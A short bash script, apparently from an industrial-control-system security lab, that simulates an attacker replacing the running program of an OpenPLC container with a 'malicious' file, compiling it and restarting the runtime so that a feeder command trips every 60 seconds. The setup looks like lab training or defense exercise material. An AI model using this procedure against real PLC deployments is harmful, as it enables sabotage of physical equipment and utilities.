#!/bin/bash
# Simulates the attack vector via a local script bypassing the Web UI for automated lab triggering
# This mimics an attacker with SSH or shell access replacing the active project

echo "[*] Injecting malicious logic directly into OpenPLC runtime..."
podman cp ./investigation/active_malicious.st openplc_blue:/docker_persistent/st_files/active_malicious.st
podman exec openplc_blue bash -c "echo 'active_malicious.st' > /docker_persistent/active_program"

echo "[*] Compiling malicious program inside container..."
podman exec openplc_blue bash -c "cd /workdir/webserver && ./scripts/compile_program.sh active_malicious.st"

echo "[*] Triggering runtime restart to activate new logic..."
podman stop openplc_blue
sleep 2
podman start openplc_blue

echo "[+] Attack deployed. FEEDER_3_CMD will now trip every 60 seconds."